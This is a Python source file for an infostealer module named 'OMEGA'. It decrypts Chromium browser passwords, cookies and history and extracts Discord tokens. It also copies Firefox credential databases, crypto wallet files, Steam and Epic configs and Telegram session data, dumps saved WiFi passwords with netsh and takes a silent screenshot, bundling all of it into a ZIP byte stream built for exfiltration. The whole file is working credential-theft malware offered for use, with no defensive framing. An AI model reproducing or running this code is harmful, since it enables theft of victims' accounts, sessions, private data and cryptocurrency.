import os, sys, time, json, shutil, sqlite3, ctypes, threading, re, base64, glob, zipfile, io
from Cryptodome.Cipher import AES

# ── OMEGA Helper Modules ──────────────────────────────────────────────────────
def _get_master_key(path):
    """Decrypts the Chromium Local State key."""
    try:
        if not os.path.exists(path): return None
        with open(path, "r", encoding="utf-8") as f:
            state = json.load(f)
        key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
        return ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(ctypes.create_string_buffer(key)), None, None, None, None, 0, None)
    except: return None

def _decrypt_value(val, key):
    """Decrypts AES-GCM encrypted values (Chrome 80+)."""
    try:
        nonce, cipher, tag = val[3:15], val[15:-16], val[-16:]
        ae = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return ae.decrypt_and_verify(cipher, tag).decode()
    except: return ""

def _harvest_browser_data(browser_name, base_path):
    """Deep harvest for a single browser."""
    results = {"passwords": [], "cookies": [], "cards": [], "autofill": []}
    if not os.path.exists(base_path): return results

    master_key = _get_master_key(os.path.join(base_path, "Local State"))
    if not master_key: return results

    profiles = glob.glob(os.path.join(base_path, "Default")) + glob.glob(os.path.join(base_path, "Profile *"))
    for profile in profiles:
        # 1. Passwords
        p_db = os.path.join(profile, "Login Data")
        if os.path.exists(p_db):
            tmp = os.path.join(os.environ["TEMP"], f"mrl_p_{int(time.time())}.db")
            try:
                shutil.copy2(p_db, tmp)
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for r in cur.fetchall():
                    pw = _decrypt_value(r[2], master_key)
                    if pw: results["passwords"].append({"browser": browser_name, "url": r[0], "user": r[1], "pass": pw})
                conn.close(); os.remove(tmp)
            except: pass

        # 2. Cookies
        c_db = os.path.join(profile, "Network", "Cookies")
        if not os.path.exists(c_db): c_db = os.path.join(profile, "Cookies")
        if os.path.exists(c_db):
            tmp = os.path.join(os.environ["TEMP"], f"mrl_c_{int(time.time())}.db")
            try:
                shutil.copy2(c_db, tmp)
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
                for r in cur.fetchall():
                    val = _decrypt_value(r[3], master_key)
                    if val:
                        c_obj = {"host": r[0], "name": r[1], "path": r[2], "val": val, "expires": r[4]}
                        results["cookies"].append(c_obj)
                        # Special Session Extraction
                        if "twitter.com" in r[0] and r[1] == "auth_token": results["cards"].append({"site": "Twitter", "token": val})
                        if "instagram.com" in r[0] and r[1] in ["sessionid", "ds_user_id"]: results["cards"].append({"site": "Instagram", "key": r[1], "val": val})
                        if "netflix.com" in r[0]: results["autofill"].append({"site": "Netflix", "name": r[1], "val": val})
                conn.close(); os.remove(tmp)
            except: pass

        # 3. History
        h_db = os.path.join(profile, "History")
        if os.path.exists(h_db):
            tmp = os.path.join(os.environ["TEMP"], f"mrl_h_{int(time.time())}.db")
            try:
                shutil.copy2(h_db, tmp)
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
                history = [f"[{time.ctime(r[3]/1000000)}] {r[1]} | {r[0]} ({r[2]} visits)" for r in cur.fetchall()]
                results["autofill"].append({"site": "HISTORY_DUMP", "data": history})
                conn.close(); os.remove(tmp)
            except: pass

    return results

def _harvest_firefox_data(zip_obj, log_func):
    """Firefox uses a completely different encryption (nss3/key4.db)."""
    log_func("[FIREFOX] Analyzing Profiles...")
    path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(path): return
    for root, _, files in os.walk(path):
        for file in files:
            if file in ["key4.db", "logins.json", "cookies.sqlite"]:
                zip_obj.write(os.path.join(root, file), arcname=os.path.join("Browsers/Firefox", os.path.basename(root), file))
    log_func("[FIREFOX] Credentials bundled (RAW)")

def get_discord_tokens():
    """Extracts all Discord tokens (including encrypted ones)."""
    tokens = []
    local = os.environ.get('LOCALAPPDATA', '')
    roaming = os.environ.get('APPDATA', '')
    
    paths = {
        'Discord': os.path.join(roaming, 'discord'),
        'Discord PTB': os.path.join(roaming, 'discordptb'),
        'Discord Canary': os.path.join(roaming, 'discordcanary'),
        'Lightcord': os.path.join(roaming, 'Lightcord'),
        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable')
    }

    for name, path in paths.items():
        if not os.path.exists(path): continue
        master_key = None
        ls_path = os.path.join(path, "Local State")
        if not os.path.exists(ls_path): ls_path = os.path.join(os.path.dirname(path), "Local State")
        if os.path.exists(ls_path): master_key = _get_master_key(ls_path)

        ldb_paths = [os.path.join(path, 'Local Storage', 'leveldb'), os.path.join(path, 'Default', 'Local Storage', 'leveldb')]
        for ldb_path in ldb_paths:
            if not os.path.exists(ldb_path): continue
            for file in glob.glob(ldb_path + "/*.ldb") + glob.glob(ldb_path + "/*.log"):
                try:
                    with open(file, "r", errors='ignore') as f:
                        content = f.read()
                        for enc_token in re.findall(r"dQw4w9WgXcQ:[^\"' ]+", content):
                            enc_token = enc_token.split("dQw4w9WgXcQ:")[1]
                            if enc_token in tokens: continue
                            if master_key:
                                try:
                                    decoded = base64.b64decode(enc_token)
                                    token = _decrypt_value(decoded, master_key)
                                    if token and token not in tokens: tokens.append(token)
                                except: pass
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", content):
                            if token not in tokens: tokens.append(token)
                except: pass
    return list(set(tokens))

def harvest_system_report():
    """Generates a hardware/spec inventory."""
    import platform, socket, uuid
    report = f"OMEGA PRO SYSTEM REPORT\n"
    report += f"========================\n"
    report += f"OS: {platform.platform()}\n"
    report += f"Hostname: {socket.gethostname()}\n"
    report += f"User: {os.getlogin()}\n"
    report += f"HWID: {uuid.getnode()}\n"
    try:
        import psutil
        report += f"CPU: {platform.processor()}\n"
        report += f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
    except: pass
    return report

def take_silent_screenshot():
    """Captures a screenshot without dependencies if possible, or returns None."""
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except: return None

def harvest_wallets(zip_obj):
    """Zips crypto wallet files for exfiltration."""
    base = os.environ["APPDATA"]
    wallets = {
        "Exodus": os.path.join(base, "Exodus", "exodus.wallet"),
        "Atomic": os.path.join(base, "atomic", "Local Storage", "leveldb"),
        "Electrum": os.path.join(base, "Electrum", "wallets"),
        "Coinomi": os.path.join(os.environ["LOCALAPPDATA"], "Coinomi", "Coinomi", "wallets")
    }
    for name, path in wallets.items():
        if os.path.exists(path):
            for root, _, files in os.walk(path):
                for file in files:
                    zip_obj.write(os.path.join(root, file), arcname=os.path.join("Wallets", name, file))

def harvest_gaming(zip_obj, log_func):
    """Zips gaming account metadata."""
    log_func("[GAMING] Checking Steam/Epic...")
    epic = os.path.join(os.environ["LOCALAPPDATA"], "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini")
    if os.path.exists(epic): zip_obj.write(epic, arcname="Gaming/EpicGames/GameUserSettings.ini")
    
    steam = os.path.join(os.environ["PROGRAMFILES(X86)"], "Steam", "config")
    if os.path.exists(steam):
        for file in ["loginusers.vdf", "config.vdf"]:
            fpath = os.path.join(steam, file)
            if os.path.exists(fpath): zip_obj.write(fpath, arcname=os.path.join("Gaming/Steam", file))

def harvest_wifi(zip_obj, log_func):
    """Retrieves all saved WiFi passwords via netsh."""
    log_func("[SYSTEM] Extracting WiFi Credentials...")
    import subprocess
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore')
        profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
        wifi_data = ""
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors='ignore')
                results = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                wifi_data += f"SSID: {i} | PASS: {results[0] if results else 'None'}\n"
            except: pass
        if wifi_data: zip_obj.writestr("System/wifi_passwords.txt", wifi_data)
    except: pass

def harvest_telegram(zip_obj, log_func):
    """Deep harvest of Telegram Desktop tdata."""
    log_func("[IMs] Scanning Telegram...")
    tpath = os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")
    if os.path.exists(tpath):
        for root, _, files in os.walk(tpath):
            if "D877F783D5D3EF8C" in root or "map" in root: # Critical session files
                for f in files:
                    zip_obj.write(os.path.join(root, f), arcname=os.path.join("IMs/Telegram", os.path.relpath(os.path.join(root, f), tpath)))


def run_omega_harvest(log_func=None):
    """Main Harvest Service: Returns a ZIP byte stream."""
    if log_func is None: log_func = lambda x: None
    mem_zip = io.BytesIO()
    with zipfile.ZipFile(mem_zip, "w", zipfile.ZIP_DEFLATED) as zf:
        # 1. Chromium Browsers
        log_func("[BROWSERS] Analyzing Chromium Profiles...")
        la = os.environ["LOCALAPPDATA"]; ap = os.environ["APPDATA"]
        loot = {
            "Chrome": os.path.join(la, "Google", "Chrome", "User Data"),
            "Edge":   os.path.join(la, "Microsoft", "Edge", "User Data"),
            "Brave":  os.path.join(la, "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera":  os.path.join(ap, "Opera Software", "Opera Stable"),
            "OperaGX":os.path.join(ap, "Opera Software", "Opera GX Stable"),
            "Vivaldi":os.path.join(la, "Vivaldi", "User Data")
        }
        all_creds = []
        for name, path in loot.items():
            if os.path.exists(path):
                log_func(f"[BROWSERS] Looting {name}...")
                b_data = _harvest_browser_data(name, path)
                all_creds.append(b_data)
        zf.writestr("Browsers/chromium_creds.json", json.dumps(all_creds, indent=4))

        # 2. History & Sessions (extracted from Browser Data)
        history_logs = []
        sessions = []
        for b in all_creds:
            for item in b["autofill"]:
                if item.get("site") == "HISTORY_DUMP": history_logs.extend(item["data"])
            for item in b["cards"]:
                sessions.append(f"[{item.get('site')}] {json.dumps(item)}")
        
        if history_logs: zf.writestr("Browsers/History.txt", "\n".join(history_logs))
        if sessions: zf.writestr("Browsers/Sessions.txt", "\n".join(sessions))

        # 3. Discord
        log_func("[DISCORD] Extraction in progress...")
        zf.writestr("Communication/discord_tokens.txt", "\n".join(get_discord_tokens()))

        # 4. System & Screenshot
        log_func("[SYSTEM] Generating Inventory...")
        zf.writestr("System/inventory.txt", harvest_system_report())
        scr = take_silent_screenshot()
        if scr: zf.writestr("System/screenshot.png", scr)

        # 5. Crypto & Gaming
        harvest_wallets(zf)
        harvest_gaming(zf, log_func)
        harvest_wifi(zf, log_func)
        harvest_telegram(zf, log_func)

    log_func("[HARVEST] Clinical finalization...")
    mem_zip.seek(0)
    return mem_zip.read()
